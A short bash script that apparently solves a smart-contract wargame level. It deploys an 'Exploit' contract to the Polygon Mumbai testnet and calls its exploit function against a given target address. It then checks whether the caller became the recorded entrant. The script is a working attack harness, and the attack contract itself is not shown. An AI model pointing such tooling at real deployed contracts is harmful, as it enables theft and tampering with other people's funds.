#!/bin/bash

PRIVATE_KEY="$1"
if [ -z "$PRIVATE_KEY" ]
then
    echo "PRIVATE_KEY must be passed as the first argument" >&2
    exit 1
fi

CONTRACT_ADDRESS="$2"
if [ -z "$CONTRACT_ADDRESS" ]
then
    echo "CONTRACT_ADDRESS must be passed as the second argument" >&2
    exit 1
fi

echo "[INFO] Deploying exploit contract..." >&2
EXPLOIT_ADDRESS=$(forge create \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key $PRIVATE_KEY \
    src/Exploit.sol:Exploit\
    | grep "Deployed to:" \
    | awk '{print $3}')

if [ $? -ne 0 ] || [ -z "$EXPLOIT_ADDRESS" ]
then
    echo "[ERROR] Exploit contract deployment failed" >&2
    exit 1
fi
echo "[INFO] Contract deployed to $EXPLOIT_ADDRESS" >&2

echo "[INFO] Calling exploit function..." >&2
cast send $EXPLOIT_ADDRESS \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    --private-key "$PRIVATE_KEY" \
    "exploit(address)(bool)" \
    "$CONTRACT_ADDRESS" >/dev/null

echo "[INFO] Checking if exploit succeeded..." >&2
ENTRANT=$(cast call $CONTRACT_ADDRESS \
    --rpc-url https://matic-mumbai.chainstacklabs.com \
    "entrant()(address)" \
    "$CONTRACT_ADDRESS")

EXPECTED=$(cast wallet address $PRIVATE_KEY)

if [ "$ENTRANT" == "$EXPECTED" ]
then
    echo "solved!"
else
    echo "[ERROR] exploit failed '$ENTRANT' != '$EXPECTED'" >&2
fi
